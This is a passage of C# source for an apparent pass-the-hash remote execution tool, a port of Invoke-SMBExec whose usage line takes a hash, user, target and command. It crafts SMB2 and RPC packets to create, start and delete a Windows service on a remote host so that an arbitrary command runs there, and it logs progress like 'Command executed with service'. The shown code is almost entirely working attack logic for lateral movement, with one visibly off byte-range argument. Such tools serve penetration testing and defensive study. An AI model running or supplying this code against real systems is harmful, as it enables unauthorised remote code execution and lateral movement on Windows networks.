                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);

                                            if(SMB_split_stage_final <= 2)
                                            {
                                                SMBClientStage = "CreateServiceW_Last";
                                            }
                                            else
                                            {
                                                SMB_split_stage = 2;
                                                SMBClientStage = "CreateServiceW_Middle";
                                            }
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;

                                    case "CreateServiceW_Middle":
                                        {
                                            SMB_split_stage++;
                                            SMB2_message_ID++;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            byte[] SCM_data_middle = getByteRange(SCM_data, SMB_split_index_tracker, SMB_split_index - 1);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x00 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_middle);
                                            packet_RPC_data["RPCRequest_AllocHint"] = BitConverter.GetBytes(SCM_data.Length - SMB_split_index_tracker + SMB_split_index);
                                            SMB_split_index_tracker += SMB_split_index;
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = CombineByteArray(SMB2_Sign, RPC_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);

                                            if(SMB_split_stage >= SMB_split_stage_final)
                                            {
                                                SMBClientStage = "CreateServiceW_Last";
                                            }
                                            else
                                            {
                                                SMBClientStage = "CreateServiceW_Middle";
                                            }
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;

                                    case "CreateServiceW_Last":
                                        {
                                            SMB2_message_ID++;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            byte[] SCM_data_last = getByteRange(SCM_data, SMB_split_index_tracker, SCM_data.Length);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x02 }, 0, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0c, 0x00 }, SCM_data_last);
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = CombineByteArray(SMB2_Sign, RPC_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;

                                    case "StartServiceW":
                                        {
                                            if (BitConverter.ToString(getByteRange(SMBClientReceive, 132, 135)) == "00-00-00-00")
                                            {
                                                Console.WriteLine("Service {0} created on {1}", SMB_service, target);
                                                SMB_service_context_handle = getByteRange(SMBClientReceive, 112, 131);
                                                SMB2_message_ID += 20;
                                                packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                                packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                                if (SMB_signing)
                                                {
                                                    packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                                }
                                                OrderedDictionary packet_SCM_data = GetPacketSCMStartServiceW(SMB_service_context_handle);
                                                SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                                OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x13, 0x00 }, null);
                                                byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                                OrderedDictionary packet_SMB2_data = GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                                byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                                byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                                int RPC_data_length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                                OrderedDictionary packet_netBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                                byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                                if (SMB_signing)
                                                {
                                                    HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                    byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                    SMB2_Sign = CombineByteArray(SMB2_Sign, RPC_data);
                                                    SMB2_Sign = CombineByteArray(SMB2_Sign, SCM_data);
                                                    byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                    SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                    packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                    SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                                }
                                                SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                                SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                                SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                                SMB_client_send = CombineByteArray(SMB_client_send, SCM_data);
                                                SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                                SMBClientStream.Flush();
                                                SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                                SMBClientStage = "ReadRequest";
                                                SMB_client_stage_next = "DeleteServiceW";
                                            }
                                            else if (BitConverter.ToString(getByteRange(SMBClientReceive, 132, 135)) == "31-04-00-00")
                                            {
                                                Console.WriteLine("Service {0} creation failed on {1}", SMB_service, target);
                                                SMBExec_failed = true;
                                            }
                                            else
                                            {
                                                Console.WriteLine("Service creation fault context mismatch");
                                                SMBExec_failed = true;
                                            }
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;

                                    case "DeleteServiceW":
                                        {
                                            if (BitConverter.ToString(getByteRange(SMBClientReceive, 108, 111)) == "1d-04-00-00")
                                            {
                                                Console.WriteLine("Command executed with service {0} on {1}", SMB_service, target);
                                            }
                                            else if (BitConverter.ToString(getByteRange(SMBClientReceive, 108,11)) == "02-00-00-00")
                                            {
                                                Console.WriteLine("Service {0} failed to start on {1}", SMB_service, target);
                                            }

                                            SMB2_message_ID += 20;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            OrderedDictionary packet_SCM_data = GetPacketSCMDeleteServiceW(SMB_service_context_handle);
                                            SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = CombineByteArray(SMB2_Sign, RPC_data);
                                                SMB2_Sign = CombineByteArray(SMB2_Sign, SCM_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadRequest";
                                            SMB_client_stage_next = "CloseServiceHandle";
                                            SMB_close_service_handle_stage = 1;
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;

                                    case "CloseServiceHandle":
                                        {
                                            OrderedDictionary packet_SCM_data;
                                            if(SMB_close_service_handle_stage == 1)
                                            {
                                                Console.WriteLine("Service {0} deleted on {1}", SMB_service, target);
                                                SMB2_message_ID += 20;
                                                SMB_close_service_handle_stage++;
                                                packet_SCM_data = GetPacketSCMCloseServiceHandle(SMB_service_context_handle);
                                            }
                                            else
                                            {
                                                SMB2_message_ID++;
                                                SMBClientStage = "CloseRequest";
                                                packet_SCM_data = GetPacketSCMCloseServiceHandle(SMB_service_manager_context_handle);
                                            }
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            SCM_data = ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                            byte[] RPC_data = ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = CombineByteArray(SMB2_Sign, RPC_data);
                                                SMB2_Sign = CombineByteArray(SMB2_Sign, SCM_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }

                                    }
                                        break;
                                    case "CloseRequest":
                                        {
                                            SMB2_message_ID += 20;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x06, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2CloseRequest(SMB_file_ID);
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_netBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "TreeDisconnect";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;

                                    case "TreeDisconnect":
                                        {
                                            SMB2_message_ID++;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x04, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2TreeDisconnectRequest();
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_netBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "Logoff";
                                        if (debugging == true) { Console.WriteLine("Communicating...Current Stage: {0}", SMBClientStage); }
                                    }
                                        break;
                                    case "Logoff":
                                        {
                                            SMB2_message_ID += 20;
                                            packet_SMB2_header = GetPacketSMB2Header(new byte[] { 0x02, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_SMB2_data = GetPacketSMB2SessionLogoffRequest();
                                            byte[] SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_netBIOS_session_service = GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "exit";
                                    }
                                        break;
                                }
                            }
                        }

                    }
                SMBClient.Close();
                SMBClientStream.Close();
            }
        }

        public static void displayHelp(string message)
        {
            Console.WriteLine("{0} \r\n Usage: Sharp-InvokeWMIExec.exe -h=\"hash\" -u=\"test\\username\" -t=\"target\" -c=\"command\" ", message);
            Console.ReadKey();
            Environment.Exit(-1);
        }
        public static byte[] getByteRange(byte[] array, int start, int end)
        {
            var newArray = array.Skip(start).Take(end-start+1).ToArray();
            return newArray;
        }
        static private byte[] CombineByteArray(byte[] a, byte[] b)
        {
            byte[] c = new byte[a.Length + b.Length];
            Buffer.BlockCopy(a, 0, c, 0, a.Length);
            Buffer.BlockCopy(b, 0, c, a.Length, b.Length);
            return c;
        }
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        private static void PrintByteArray(byte[] thebizz, string location)
        {
            Console.WriteLine("Debugging output for: " + location);
            for (int i = 0; i < thebizz.Length; ++i)
            {
                Console.Write("{0:X2}" + " ", thebizz[i]);
            }
            
            Console.WriteLine("\n*******************");
        }
        private static byte[] ConvertFromPacketOrderedDictionary(OrderedDictionary packet_ordered_dictionary)
        {
            List<byte[]> byte_list = new List<byte[]>();
            foreach(DictionaryEntry de in packet_ordered_dictionary)
            {
                byte_list.Add(de.Value as byte[]);
            }

            var flattenedList = byte_list.SelectMany(bytes => bytes);
            byte[] byte_Array = flattenedList.ToArray();

            return byte_Array;
        }

        private static OrderedDictionary GetPacketNetBIOSSessionService(int packet_header_length, int packet_data_length)
        {
            byte[] packet_netbios_session_service_length = BitConverter.GetBytes(packet_header_length + packet_data_length);
            packet_netbios_session_service_length = new byte[] { packet_netbios_session_service_length[2], packet_netbios_session_service_length[1], packet_netbios_session_service_length[0] };

            OrderedDictionary packet_NetBIOSSessionService = new OrderedDictionary();
            packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type", new byte[] { 0x00 });
            packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length", packet_netbios_session_service_length);

            return packet_NetBIOSSessionService;
        }

        private static OrderedDictionary GetPacketSMBHeader(byte[] packet_command, byte[] packet_flags, byte[] packet_flags2, byte[] packet_tree_ID, byte[] packet_process_ID, byte[] packet_user_ID)
        {

            //This function creates the header for an SMB Packet.
            OrderedDictionary packet_SMBHeader = new OrderedDictionary();
            //SMBHeader_Protocol must include the byte representation of xFF, S, M, B in byte format.
            packet_SMBHeader.Add("SMBHeader_Protocol",new byte[] { 0xff, 0x53, 0x4d, 0x42 });
            //A one byte command code, passed to the function depending on where in the code it's called from.
            packet_SMBHeader.Add("SMBHeader_Command", packet_command);
            packet_SMBHeader.Add("SMBHeader_ErrorClass",new byte[] { 0x00 });
            packet_SMBHeader.Add("SMBHeader_Reserved", new byte[] { 0x00 });
            packet_SMBHeader.Add("SMBHeader_ErrorCode", new byte[] { 0x00, 0x00 });
            //An 8-bit field of 1-bit flags describing various features.
            //0x01 = SMB_FLAGS_LOCK_AND_READ_OK
            //0x02 = SMB_FLAGS_BUF_AVAIL
            //0x04 = Reserved
            //0x08 = SMB_FLAGS_CASE_INSENSITIVE
            //0x10 = SMB_FLAGS_CANONICALIZED_PATHS
            //0x20 = SMB_FLAGS_OPLOCK
            //0x40 = SMB_FLAGS_OPBATCH
            //0x80 = SMB_FLAGS_REPLY
            packet_SMBHeader.Add("SMBHeader_Flags", packet_flags);
            //A 16-bit field of 1-bit flags that represent various features in effect for the message. Unspecified bits are reserved and MUST be zero.
            //0x0001 = SMB_FLAGS2_LONG_NAMES - Allows you to contain long files names if set, otherwise have to adhere to the 8.3 naming convention.
            //0x0002 = SMB_FLAGS2_EAS - If Set, client is aware of extended attributes.
            //0x0004 = SMB_FLAGS2_SMB_SECURITY_SIGNATURE - SMB Signing
            //0x0040 = SMB_FLAGS2_IS_LONG_NAME - Reserved, not implemented.
            //0x1000 = SMB_FLAGS2_DFS - If set, pathnames should be resolved using DFS.
            //0x2000 = SMB_FLAGS2_PAGING_IO - This flag is useful only on a read request. If the bit is set, then the client MAY read the file if the client does not have read permission but does have execute permission. This bit field SHOULD be set to 1 when the negotiated dialect is LANMAN2.0 or later. This flag is also known as SMB_FLAGS2_READ_IF_EXECUTE.
            //0x4000 = SMB_FLAGS2_NT_STATUS - If this bit is set in a client request, the server MUST return errors as 32-bit NTSTATUS codes in the response. If it is clear, the server SHOULD<27> return errors in SMBSTATUS format.
            //0x8000 = SMB_FLAGS2_UNICODE - If set in a client request or server response, each field that contains a string in this SMB message MUST be encoded as an array of 16-bit Unicode characters, unless otherwise specified. If this bit is clear, each of these fields MUST be encoded as an array of OEM characters. This bit field SHOULD be set to 1 when the negotiated dialect is NT LANMAN.
            packet_SMBHeader.Add("SMBHeader_Flags2", packet_flags2);
            //Represents the high order bytes of a PID, when combined with ProcessIDLow forms a full PID
            packet_SMBHeader.Add("SMBHeader_ProcessIDHigh", new byte[] { 0x00, 0x00 });
            //An 8-byte SMB Signature designed to ensure the message hasn't been modified in transfer.
            packet_SMBHeader.Add("SMBHeader_Signature", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            //Reserved field and should be set to 0x0000
            packet_SMBHeader.Add("SMBHeader_Reserved2", new byte[] { 0x00, 0x00 });
            //TID - Tree Identifier (2 bytes)
            packet_SMBHeader.Add("SMBHeader_TreeID", packet_tree_ID);
            //PIDLow - The lower bytes of the PID
            packet_SMBHeader.Add("SMBHeader_ProcessID", packet_process_ID);
            //User Identifier
            packet_SMBHeader.Add("SMBHeader_UserID", packet_user_ID);
            //Multiplex Identifier
            packet_SMBHeader.Add("SMBHeader_MultiplexID", new byte[] { 0x00, 0x00 });
            return packet_SMBHeader;
        }
        private static OrderedDictionary GetPacketSMBNegotiateProtocolRequest(string packet_version)
        {
            //This function creates the packet contents to send a Negotiation request to the target.
            byte[] packet_byte_count;
            if (packet_version == "SMB1")
            {
                packet_byte_count = new byte[]{ 0x0c, 0x00 };
            }
            else
            {
                packet_byte_count = new byte[]{ 0x22, 0x00 };
            }
            //https://msdn.microsoft.com/en-us/library/ee441572.aspx
            OrderedDictionary packet_SMBNegotiateProtocolRequest = new OrderedDictionary();
            //Must be 0x00, No Parameters are sent by this message.
            packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount", new byte[] {0x00});
            //Must be greater than or equal to 0x02
            packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount", packet_byte_count);
            //This is a variable length list of dialect identifiers in order of preference from least to most preferred. The client MUST list only dialects that it supports.
            packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat", new byte[] { 0x02 });
            //A null-terminated string identifying an SMB dialect. Converts to ( N T   L M   0 . 1 2)
            packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name", new byte[] { 0x4e, 0x54, 0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00 });

            if(packet_version != "SMB1")
            {
                //Adds buffer from last supported dialect
                packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2", new byte[] { 0x02 });
                //Adds support for (SMB 2.002)
                packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2", new byte[] { 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x30, 0x30, 0x32, 0x00 });
                //Adds buffer
                packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3", new byte[] { 0x02 });
                //Adds support for other SMB by adding question marks? (SMB 2.???)
                packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3", new byte[] { 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x3f, 0x3f, 0x3f, 0x00 });
            }

            return packet_SMBNegotiateProtocolRequest;
        }
        private static OrderedDictionary GetPacketSMBSessionSetupAndXRequest(byte[] packet_security_blob)
        {
